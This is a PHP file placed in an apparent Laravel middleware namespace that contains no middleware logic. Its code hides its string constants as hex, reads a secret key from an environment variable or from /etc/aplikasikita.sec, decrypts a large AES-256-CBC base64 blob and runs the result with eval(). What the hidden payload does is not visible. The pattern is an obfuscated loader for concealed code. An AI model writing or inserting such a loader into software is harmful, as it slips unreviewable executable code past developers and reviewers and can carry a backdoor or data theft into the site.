<?php
namespace App\Http\Middleware;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('XVpRs6fxEsZLuqqTxzbPzw==');

$c=base64_decode(

'pxMVvZuUDmddqziLu/XORKF9/7GKyxpasW9I8SRvmU4YOxGbC+BJ4fAwpcEDy00gwz96wsPajGCS' .
'kn6VAqYKM2pEBjOC3aYTFxwio+67t0o7oDrXiXdUxS7J4g97jVBF7xn5LpUlfj0AXX80E6CW2dn1' .
'oJrGKHmfrGahJ5ql4ErwSnlB5BlJA3c+eBjE5XDadLhm9GZRmD6izyQS58GmF8j/iqblwBFFs9BQ' .
'++tin4IZhuxZtw4lqRpRYig5JfOXM5zRjUL3rob8eoCaO685QV8eN30Pw77RWcmxyi+doxI8OnBC' .
'sMgTCkr9rIxqVzLS4udoqSw2gcqOTHm9FHNwP3Lshl00Xv1fJkmlemoZkBNay9hSYkkPHKGaooFQ' .
'9bzcERzkM4TD5+hz+zfGs3788VnNyqUJ3/3bz26QvyFUTFAkFPQXNgKJdEZEKrhvdmHGymwTEheZ' .
'cmhradQT2AgT+NPlkSYUq8pWoKumblg5qabtAgWJnkikHZoxR+O3UwcfeD68C3EAKiSj+O++Vz08' .
'k1yjwCV+azTV+iHLiDuDm5Ib1qzE8xGEmy4Y/1dzWeLemsxYlefkhJEBylNaFC3UbfP3gpDl6o9G' .
'CoGczZO1FA0elQj4qpd+yzQLBo9Vwe49tbOMYLtd3enuCr5Wbw1xVyuZxdvwDMrBUxkd+PM6rxHG' .
'HNuNgTrVMRjFr0Tt9scQPMlZ5VUi+T6ZBVggWwd+bwgy2tV0SNHGd2PX23XfRvmV8Xu/UHTpckWm' .
'G+drCpa2TCMfKaOSvHM3peViCS/Ld84rMOZjTg8AZkNWYNB5QhONwrMp3hXps7ziwipYsFVMKFJK' .
'cXtyqbMKJQq2Dn1EwqoG9xcYGFTWG0ny2k+Vp/vLx8U65oUvK+w7J01vyO95lMbYKo93YWWDkS7E' .
'bTR4NUoiUeXaPql9XBVbMegEQ7jtyIj6T6XCFRj5m+0uu+NekDfutKEfAXyqsJ7I7kf+V4NdXLys' .
'ggA7iHJ1exx+bbLdGUmpNj1VLaf9q98YRfq9jAGpXzPDLseq9z6ciTJs3jIAa2DJ+JbETKUJx/dT' .
'+dnzg9PbVq2TJY8kIrjt7rir/Cv86cgn82XIzEJq6UWzrK7akHYpAXbZGbwyWqTi5941UFoTF83F' .
'JGI1bZelKqD2bK8l1bzWPOnKXuQJH/d9sS+Kgx2+EH04M8LM6I1FZOnaEzGqEWn6PRysWo8jCMk9' .
'sktlMmuXNETjP2qLxRkF5ozmjKfeojenPObOKl04HKyRPcEFa3ao5w+qcdgTH62Xa1W0QZX8hYlM' .
'X0vx20zpGLm4ZtvRCTgdGar7+3gPAbdY3ZORdDKHPttXxk8dGFLU2LZXULQU43/EikOFUxwzWSzH' .
'CR+lfADk94TdtVhZbsmiJOV58EO+M3urlXsmci1pvZTxI1dmuFwfdj/xM5/pEMx9jSmwmyH8kbS7' .
'cHsoYnAwLkr0ti5yzGV15WEsRutBiLXnbarIupatBEGEH3ovUcYPTEtaNLR5KuN1+PbLjNZAbXKQ' .
'u0XxP8tpC/C60BC8XDMZklKI7L70/oZ1RSphZw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

